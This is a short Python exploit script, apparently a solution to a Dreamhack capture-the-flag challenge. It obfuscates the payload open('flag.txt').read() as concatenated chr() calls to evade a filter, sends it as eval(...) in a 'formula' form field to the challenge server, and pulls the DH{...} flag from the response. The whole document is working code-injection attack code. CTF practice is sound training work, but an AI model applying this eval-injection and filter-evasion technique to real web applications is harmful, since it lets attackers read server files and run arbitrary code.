import requests
import re

original_payload = "open('flag.txt').read()"
updated_payload = '+'.join([f'chr({ord(c)})' for c in original_payload])

url = 'http://host3.dreamhack.games:20346'


res = requests.post(url, data={'formula': f'eval({updated_payload})'})
match = re.search(r'DH\{[^<]*\}', res.text)
print(match.group(0))